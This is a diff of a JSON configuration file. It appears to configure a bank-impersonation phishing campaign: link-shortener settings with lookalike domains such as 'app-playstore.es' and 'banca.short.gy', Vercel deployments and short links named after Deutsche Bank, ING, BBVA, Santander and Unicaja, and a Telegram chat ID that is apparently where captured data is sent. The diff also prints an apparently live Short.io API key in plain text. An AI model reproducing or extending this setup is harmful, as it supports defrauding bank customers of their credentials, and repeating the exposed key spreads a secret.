@@ -10,9 +10,9 @@
       "chat_id": "[REDACTED_FROM_REPORT]"
     },
     "shortio": {
-      "api_key": "[REDACTED_FROM_REPORT]",
-      "domain": "app-playstore.es",
-      "domain_id": 1760496
+      "api_key": "sk_R5l4q1Htbid08ppC",
+      "domain": "banca.short.gy",
+      "domain_id": 1778399
     },
     "vercel": {
       "token": "[REDACTED_FROM_REPORT]",
@@ -30,7 +30,7 @@
     "deutschebank": "https://vercel-deutschebank.vercel.app"
   },
   "shortio_links": {
-    "ing": "lnk_7nZ6_vg5ltYl29IoM8lIiEymLX",
+    "ing": "lnk_7sDR_uTRe21jSMWgutn4boajsg",
     "bbva": "lnk_7nZ6_uiMiJwzOLeZAlQfeIZQaA",
     "santander": "lnk_7nZ6_GOWmygcDBGFoDidnwUPGx",
     "unicaja": "lnk_7nZ6_ZQusZ7Jaw8o6uXjm2nJhr",
